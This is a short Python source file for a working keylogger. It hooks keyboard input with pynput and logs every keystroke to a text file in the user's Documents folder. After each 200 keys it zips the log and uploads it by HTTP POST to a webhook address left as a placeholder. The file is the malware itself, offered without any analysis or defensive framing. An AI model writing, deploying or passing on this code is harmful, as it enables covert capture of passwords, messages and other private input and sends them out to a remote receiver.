from pynput.keyboard import Key, Listener
import requests
import zipfile
from os import path

webhook = "WEBHOOK HERE"


count = 0
keys = []

file_path = path.join(path.expanduser("~"), "Documents")
log_path = path.join(file_path, "log.txt")
zip_path = path.join(file_path,"logs.zip")

def on_press(key):
    global count, keys
    count += 1
    # print("{0} basıldı".format(key)) for testing code
    keys.append(key)

    if count >= 200:
        count = 0
        write_file(keys)
        keys = []
        zipandshare()


def write_file(keys):
    with open(log_path, "a", encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("enter") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def zipandshare():
    with zipfile.ZipFile(zip_path, "w") as zip:
        zip.write(log_path,path.basename(log_path))

    with open(zip_path, "rb") as zip_file:
        payload_data = {
            "file": ("logs.zip", zip_file)
        }
        response = requests.post(webhook, files=payload_data)


with Listener(on_press=on_press) as listener:
    listener.join()
